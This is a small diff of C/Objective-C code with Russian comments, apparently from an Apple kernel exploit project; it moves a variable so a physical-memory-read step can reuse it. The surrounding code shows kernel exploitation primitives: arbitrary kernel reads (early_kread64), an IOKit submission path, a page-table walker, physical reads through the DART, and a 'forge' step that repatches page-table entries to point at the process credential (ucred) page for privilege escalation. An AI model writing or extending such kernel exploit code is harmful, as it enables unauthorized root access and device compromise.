@@ -6487,7 +6487,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // паника назовёт адрес (x1), остальное не тронуто.
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
-    uint64_t buf247 = 0, flOld247 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор)
+    uint64_t buf247 = 0, flOld247 = 0, dq252 = 0;   // 1.9.248: record buffer CHAIN + flags-оригинал — пост-submit дампы (H1 rebuild vs H2 mapper-игнор); 1.9.257: dq252 = dst entry-оригинал для physread
     // 1.9.247: CHAIN (р.61) — АВТОРИТЕТНЫЙ record buffer дескриптора, ноль сканов.
     // Цепочка: [surf+0x30]=pd → [pd+0x90]=hdr → [hdr+0x10]=buffer;
     // buffer+0x28=count (0x20=32 стр. для 512KB), +0x2d=flags(bit1=built),
@@ -7823,7 +7823,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
                     uint8_t timg[0x4000];
-                    uint64_t dq252 = buf247 ? ((early_kread64(buf247 + 0x30) & 0xffffffff00000000ULL) | pfn32) : 0;
+                    dq252 = buf247 ? ((early_kread64(buf247 + 0x30) & 0xffffffff00000000ULL) | pfn32) : 0;
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
                               kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
                     if (kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, tpage, timg, r)) {
